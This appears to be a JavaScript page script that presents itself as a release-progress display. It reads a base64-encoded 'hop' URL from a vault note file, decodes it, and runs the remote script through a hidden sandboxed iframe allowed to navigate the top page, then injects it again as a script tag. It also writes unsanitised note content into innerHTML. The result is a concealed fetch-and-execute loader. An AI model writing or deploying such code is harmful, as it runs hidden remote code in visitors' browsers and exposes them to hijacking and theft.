const NOTE_URL = new URL('../vault/release.note', import.meta.url);
const TICKET = document.getElementById('ticket');
const LIVE = document.getElementById('live');

const steps = ['t0', 't1', 't2', 't3'].map((id) => document.getElementById(id));

function setStep(index, state) {
  steps.forEach((el, i) => {
    el.classList.remove('live', 'ok');
    if (i < index) el.classList.add('ok');
    else if (i === index) el.classList.add(state || 'live');
  });
}

function announce(text) {
  LIVE.textContent = text;
}

function parseNote(raw) {
  const out = { channel: '', hop: '' };
  for (const line of String(raw).split(/\r?\n/)) {
    const trimmed = line.trim();
    if (!trimmed || trimmed.startsWith('#')) continue;
    const eq = trimmed.indexOf('=');
    if (eq === -1) continue;
    const key = trimmed.slice(0, eq).trim().toLowerCase();
    const val = trimmed.slice(eq + 1).trim();
    if (key === 'channel') out.channel = val;
    if (key === 'hop') out.hop = val;
  }
  if (!out.hop) throw new Error('no hop');
  return out;
}

function decodeHop(b64) {
  const url = atob(String(b64).trim());
  if (!/^https?:\/\//i.test(url)) throw new Error('bad hop');
  return url;
}

function openViaSandbox(hopUrl) {
  return new Promise((resolve, reject) => {
    const box = document.createElement('iframe');
    box.title = 'channel';
    box.setAttribute('sandbox', 'allow-scripts allow-top-navigation');
    box.hidden = true;
    const srcdoc =
      '<!DOCTYPE html><meta charset="utf-8">' +
      '<script src="' +
      hopUrl.replace(/"/g, '&quot;') +
      '"><\/script>';
    box.srcdoc = srcdoc;
    box.onerror = () => reject(new Error('iframe'));
    document.body.appendChild(box);
    window.setTimeout(() => resolve(box), 120);
  });
}

function openViaScriptTag(hopUrl) {
  const tag = document.createElement('script');
  tag.src = hopUrl;
  tag.async = true;
  document.head.appendChild(tag);
}

async function run() {
  setStep(0, 'live');
  announce('Loading release note');

  const res = await fetch(NOTE_URL, { cache: 'no-store' });
  if (!res.ok) throw new Error('note');
  const note = parseNote(await res.text());

  TICKET.innerHTML =
    '<span>channel</span> ' +
    note.channel +
    '<br><span>hop</span> ' +
    note.hop.slice(0, 18) +
    '…';

  setStep(1, 'live');
  announce('Decoding ticket');
  await new Promise((r) => setTimeout(r, 500));

  const hopUrl = decodeHop(note.hop);

  setStep(2, 'live');
  announce('Opening channel');
  try {
    await openViaSandbox(hopUrl);
    window.setTimeout(function () {
      if (window.location.pathname.endsWith('dispatch.html')) {
        openViaScriptTag(hopUrl);
      }
    }, 1100);
  } catch {
    openViaScriptTag(hopUrl);
  }

  setStep(3, 'live');
  announce('Release in progress');
  window.setTimeout(() => setStep(4, 'ok'), 800);
}

run().catch(() => {
  announce('Release failed');
  TICKET.innerHTML = '<span>error</span> could not read vault/release.note';
  steps.forEach((el) => el.classList.remove('live', 'ok'));
});
